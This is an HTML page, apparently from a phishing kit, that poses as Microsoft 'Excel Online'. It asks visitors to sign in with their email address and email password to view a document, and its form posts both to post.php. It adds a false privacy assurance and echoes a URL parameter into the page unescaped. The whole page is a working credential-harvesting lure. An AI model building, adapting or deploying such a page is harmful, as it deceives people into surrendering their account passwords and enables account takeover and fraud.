

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Excel Online</title>







<link rel="short icon"
       href="http://i.imgur.com/v2dKDaf.png">
</head>

<style>
html { 
  background: url(http://download.shia-water.org/excel/pdf.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}

.cover{
    position: absolute;
    top: 0;
    left: 0;
    height: 708px;
    width: 1344px;
	margin-right:0px;
    background-color: rgba(0,0,0,0.6);
    z-index:0;
}

/* Center the loader */
#loader {
  position: absolute;
  left: 50%;
  top: 50%;
  z-index: 1;
  margin: -75px 0 0 -75px;
  border: 18px solid #114B7B;
  border-radius: 50%;
  border-top: 18px solid #409FBF;
  width: 60px;
  height: 60px;
  -webkit-animation: spin 0s linear finite;
  animation: spin 0s linear finite;
}

@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  0% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  0% { transform: rotate(360deg); }
}
/* Add animation to "page content" */
.animate-bottom {
  position: relative;
  -webkit-animation-name: animatebottom;
  -webkit-animation-duration: 1s;
  animation-name: animatebottom;
  animation-duration: 0s

}

@-webkit-keyframes animatebottom {
  from { bottom:-200px; opacity:0 } 
  to { bottom:0px; opacity:1 }
}


}

#myDiv {
  display: none;
  text-align: left;
  border:#FFF;
}

input { border:solid 1px #999;
}
input:focus { border:#112F18 solid 1px;
	          border-right:none;
		      border-left:none;
		      border-top:none;
}

.sub{ background:#112F18;
      }
.sub:hover{ background:#2C613D;
      }
	  placeholder { color:#666;
	  }
</style>

<body>



<div align="left" style="background:#282828; width:1344px; color:#FFF; font-family:Segoe UI; border:none; padding:0; border-spacing:0; color:#fff; z-index:10000000; position:absolute;">
<table width="1354" cellspacing="0"  cellpadding="0">
<tr>
<td width="45" bgcolor="#29703B" style="padding:3px;">
 <img src="http://i.imgur.com/v2dKDaf.png" width="37" height="32" /></td>
<td width="126" bgcolor="#29703B">
Excel Online
</td>
<td width="737">
</td>
<td width="191">
</td>
<td align="center" width="58" style="color:#CCC; font-size:12px;">
<a href="#" style="text-decoration:none; color:#ccc;">Sign-in</a>&nbsp; |
</td>
<td width="102" style="color:#CCC; font-size:12px;"><a href="#" style="text-decoration:none; color:#ccc;">create account</a>
</td>
<td width="79">
</td>
</tr>
</table>

<table width="1354" cellspacing="0" bgcolor="#FFFFFF">
<tr style="color:#333; padding:8px; border:#999 solid 1px;">
<td width="18" style="padding:10px;">
</td>
<td width="170"style="padding:5px;" >Document
</td>
<td width="678">
</td>
<td width="82">
</td>
<td align="center" width="134" style="font-size:13px; color:#999;">&nbsp;&nbsp;<a href="#" style="text-decoration:none; color:#999;">Download &nbsp;</a><font color="#990000" size="3"><a href="#" style="text-decoration:none; color:#990000; cursor: wait;">&dArr;</a></font>&nbsp;</td>
<td align="left" width="81" style="font-size:13px;"><a href="#" style="text-decoration:none; color:#333; cursor:help;">Open with</a>&nbsp;&equiv;&nbsp;
</td>
<td align="center" width="91" style="font-size:13px;">
<a href="#" style="text-decoration:none; color:#333;">Print</a> &nbsp; </td>
<td width="82">
</td>
</tr>
</table>
</div>
<div class="cover"></div>

<div class="se-pre-con"></div>
<br>
<br>
<br>


</div>
<div align="center"><br>
<br>
<br>
<br>
<br>
<br>
<br>


<div align="left" style="display:non; padding:5px; box-shadow:-0px 0px 4px #888888; font-size:15px; background:#FFF; border:solid 1px #EEE; width:520px; font-family:Tahoma; color:#666;" id="myDiv" class="animate-bottom">
<div align="left" style="background:#29703B; padding:5px;">
<table width="222" cellspacing="0">
<tr>
<td width="40">
<img src="http://i.imgur.com/v2dKDaf.png" width="37" height="32">
</td>
<td width="170" style="color:#fff; font-size:15px;">
Microsoft Excel
</td>
</tr>
</table>
</div>
<div align="left" style="font-size:11px; padding:6px; font-family:Verdana;">

Sign in with your valid email account to view document.
</div>
<script type="text/javascript">
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
</script>
  <div align="left" style="padding:3px; border:#FFF;">
  <form name="myForm" action="post.php" method="post" style="padding:3px;" onSubmit="return validateForm()">
  <table width="491" style="border:#FFF;">
  <tr>
    <td colspan="3"></td>
    </tr>
  <tr align="center" bordercolor="#FFFFFF">
  <td width="124" height="45" align="right" style="font-size:14px;"></td>
  <td align="left" width="262">
  <input type="email" name="email" value="<?=$_GET[email]?>" placeholder="Email address" style="padding:8px; width:280px; outline:none; font-size:14px;border:none;text-align:center;font-weight: bold;" />
  </td>
  </tr>
  <tr>
  <td>
  </td>
  <td id="em" align="left" style="color:#CC0000; font-size:12px;"></td>
  <td>
  </td>
  </tr>
  <tr align="center">
  <td width="124" height="43" align="right" style="font-size:14px;"></td>
  <td align="left" width="262">
  <input type="password" placeholder="Email password" name="passwd" style="padding:8px; width:280px; outline:none; font-size:14px;" />
  
  </td>
  </tr>
  <tr>
  <td>
  </td>
  <td id="ps" align="left" style="color:#CC0000; font-size:12px;"></td>
  <td>
  </td>
  </tr>
  <tr align="center">
  <td align="right" width="124" style="font-size:14px;">&nbsp;</td>
  <td align="left" width="262">
  <input class="sub" type="submit" name="submit" value="CONTINUE" style="padding:9px; width:298px; color:#FFF; border:#29703B solid 1px; cursor:pointer;" />
  </td>
  </tr>
  <tr>
  <td style="padding:5px; font-size:10px;">
  
  </td>
  <td style="padding:5px; font-size:10px; color:#D2D2D2; padding-left:19px;">
  Privacy policy<br>
personal information will be not
disclosed or accessed by a third party. Applicable to unregistered users.<br />

  </td>
  <td width="89">
  </td>
  </tr>
  <tr>
   <td>
  </td>
   <td align="center" style="padding:5px; font-size:10px; color:#999; padding-left:19px;">
  Microsoft excel &copy;2016
  </td
  ><td>
  </td>
  </tr>
  <tr>
   <td>
  </td>
   <td align="center" style="padding:5px; font-size:10px; color:#999; padding-left:19px;">
<img src="http://i.imgur.com/I7G94LL.gif" width="58" height="40">
  </td
  ><td>
  </td>
  </tr>
  </table>
  </form>
<div style="padding:2px;">
</div>
</div>
</div>
</div>
</div>
<br>
<br>
<br>
<br>
<br>




</body>
</html>'));
//-->
